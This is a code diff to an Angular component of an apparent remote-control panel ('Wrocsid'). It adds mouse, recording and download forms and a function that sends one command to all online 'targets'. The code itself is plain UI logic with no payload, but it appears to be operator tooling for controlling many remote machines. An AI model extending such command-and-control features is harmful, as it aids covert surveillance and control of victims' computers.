@@ -1,4 +1,4 @@
-import { Component, Input, OnInit, SimpleChange } from '@angular/core';
+import { Component, OnInit } from '@angular/core';
 import { WrocsidService } from 'src/app/services/wrocsid/wrocsid.service';
 import { firstValueFrom } from 'rxjs';
 import { AbstractControl, FormBuilder, FormGroup, Validators} from '@angular/forms';
@@ -17,6 +17,9 @@ export class BodyComponent implements OnInit {
   mouseForm!: FormGroup
   recordForm!: FormGroup
   downloadForm!: FormGroup
+  mouseFormAll!: FormGroup
+  recordFormAll!: FormGroup
+  downloadFormAll!: FormGroup
   disabled: boolean = true
   path: string = ""
   search: string = ""
@@ -36,6 +39,20 @@ export class BodyComponent implements OnInit {
     })
 
     this.downloadForm = this.fb.group({
+      path: ['', [Validators.required, Validators.minLength(6)]],
+    })
+
+    this.mouseFormAll = this.fb.group({
+      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
+      timeUnits: ['s']
+    })
+
+    this.recordFormAll = this.fb.group({
+      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
+      timeUnits: ['s']
+    })
+
+    this.downloadFormAll = this.fb.group({
       path: ['', [Validators.required, Validators.minLength(6)]],
     })
 
@@ -158,6 +175,17 @@ export class BodyComponent implements OnInit {
     } else {
       this.targetsSearch = this.targets.filter((target: Target) => this.searchFilter(target, this.search))
     }
+  }
+
+  sendCommandToAllOnlineTargets(command: string, args?: any) {
+    let onlineTargets = this.targets.filter((target: Target) => this.onlineFilter(target, true))
+    onlineTargets.forEach((onlineTarget: Target) => {
+      if(args) {
+        this.wrocsidHandler(command, onlineTarget.identifier, args)
+      } else {
+        this.wrocsidHandler(command, onlineTarget.identifier)
+      }
+    });
   }
 }
 
